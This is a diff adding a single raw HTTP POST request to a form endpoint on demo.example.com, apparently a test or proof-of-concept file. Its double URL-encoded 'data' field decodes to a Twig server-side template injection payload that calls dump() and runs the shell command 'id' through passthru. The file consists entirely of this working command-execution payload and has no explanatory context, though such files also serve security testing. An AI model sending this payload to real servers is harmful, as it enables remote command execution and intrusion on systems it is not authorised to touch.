@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 129
+Connection: close
+
+data=%257B%257B%2Bdump%2528%2529%2B%257D%257D%257B%257B%2B%255B%2527id%2527%255D%257Cmap%2528%2527passthru%2527%2529%2B%257D%257D
